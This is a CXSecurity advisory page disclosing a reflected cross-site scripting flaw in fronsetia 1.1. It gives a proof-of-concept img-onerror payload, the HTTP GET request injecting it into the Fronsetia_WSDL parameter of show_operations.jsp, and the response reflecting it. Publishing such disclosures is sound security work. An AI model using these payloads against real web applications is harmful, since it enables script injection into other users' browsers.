---
title: fronsetia 1.1 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2024110039
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-11-26
fetch_date: 2025-10-06T19:17:01.049619
---

# fronsetia 1.1 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **fronsetia 1.1 Cross Site Scripting** **2024.11.25**  Credit:  **[Andrey Stoykov](https://cxsecurity.com/author/Andrey%2BStoykov/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Reflected XSS - fronsetiav1.1
# Date: 11/2024
# Exploit Author: Andrey Stoykov
# Version: 1.1
# Tested on: Debian 12
# Blog:
https://msecureltd.blogspot.com/2024/11/friday-fun-pentest-series-14-reflected.html
Reflected XSS #1 - "show\_operations.jsp"
Steps to Reproduce:
1. Visit main page of the application.
2. In the input field of "WSDL Location" enter the following payload "><img
src=x onerror=alert(1)>
// HTTP GET Request
GET
/fronsetia/show\_operations.jsp?Fronsetia\_WSDL=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
HTTP/1.1
Host: 192.168.78.128:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0)
Gecko/20100101 Firefox/133.0
[...]
// HTTP Response
HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 6360
Date: Wed, 20 Nov 2024 19:42:15 GMT
Keep-Alive: timeout=20
Connection: keep-alive
[...]
<title> Fronsetia: "><img src=x onerror=alert(1)> </title>
[...]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024110039)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top